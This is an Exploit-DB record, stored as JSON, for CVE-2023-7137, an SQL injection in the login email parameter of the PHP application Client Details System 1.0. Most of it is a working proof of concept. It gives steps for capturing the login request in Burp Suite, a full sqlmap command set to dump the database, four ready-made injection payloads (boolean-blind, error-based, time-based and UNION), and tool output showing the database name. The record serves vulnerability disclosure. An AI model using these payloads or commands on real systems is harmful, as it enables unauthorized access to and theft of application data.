{"source": "https://www.exploit-db.com/exploits/51880", "vulnName": "Client Details System 1.0 - SQL Injection", "vulnEDBID": "51880", "vulnCVE": "N/A", "author": "HAMDI SEVBEN", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-12", "vulnContent": "+ **Exploit Title:** CVE-2023-7137_Client_Details_System-SQL_Injection_1\n+ **Date:** 2023-26-12\n+ **Exploit Author:** Hamdi Sevben\n+ **Vendor Homepage:** https://code-projects.org/client-details-system-in-php-with-source-code/\n+ **Software Link:** https://download-media.code-projects.org/2020/01/CLIENT_DETAILS_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip\n+ **Version:** 1.0\n+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53\n+ **CVE:** CVE-2023-7137\n\n## References: \n+ **CVE-2023-7137:** https://vuldb.com/?id.249140\n+ https://www.cve.org/CVERecord?id=CVE-2023-7137\n+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-7137\n+ https://nvd.nist.gov/vuln/detail/CVE-2023-7137\n\n## Description:\nClient Details System 1.0 allows SQL Injection via parameter 'uemail' in \"/clientdetails/\". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.\n\n## Proof of Concept:\n+ Go to the User Login page: \"http://localhost/clientdetails/\"\n+ Fill email and password.\n+ Intercept the request via Burp Suite and send to Repeater.\n+ Copy and paste the request to a \"r.txt\" file.\n+ Captured Burp request:\n```\nPOST /clientdetails/ HTTP/1.1\nHost: localhost\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nAccept-Language: en-us,en;q=0.5\nCache-Control: no-cache\nContent-Length: 317\nContent-Type: application/x-www-form-urlencoded\nReferer: http://localhost/clientdetails/\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\n\nuemail=user@mail.com&login=LOG+IN&password=P@ass123\n```\n\n+ Use sqlmap to exploit. In sqlmap, use 'uemail' parameter to dump the database. \n```\npython sqlmap.py -r r.txt -p uemail --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy=\"http://127.0.0.1:8080\" --dbms mysql --batch --current-db\n```\n\n```\n---\nParameter: uemail (POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)\n    Payload: uemail=user@mail.com' OR NOT 6660=6660-- FlRf&login=LOG IN&password=P@ass123\n\n    Type: error-based\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: uemail=user@mail.com' AND (SELECT 6854 FROM(SELECT COUNT(*),CONCAT(0x717a717a71,(SELECT (ELT(6854=6854,1))),0x7176627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Oxlo&login=LOG IN&password=P@ass123\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: uemail=user@mail.com' AND (SELECT 5335 FROM (SELECT(SLEEP(5)))qsPA)-- pwtE&login=LOG IN&password=P@ass123\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 7 columns\n    Payload: uemail=user@mail.com' UNION ALL SELECT NULL,CONCAT(0x717a717a71,0x45575259495444506f48756469467471555975554d6f794d77677a4f50547145735052567278434f,0x7176627871),NULL,NULL,NULL,NULL,NULL-- -&login=LOG IN&password=P@ass123\n---\n[14:58:11] [INFO] the back-end DBMS is MySQL\nweb application technology: Apache 2.4.53, PHP, PHP 8.1.6\nback-end DBMS: MySQL >= 5.0 (MariaDB fork)\n[14:58:11] [INFO] fetching current database\ncurrent database: 'loginsystem'\n```\n\n+ current database: `loginsystem`\n![1](https://github.com/h4md153v63n/CVEs/assets/5091265/bfbec122-5b56-42df-beda-41dfdcaf527a)\n            "}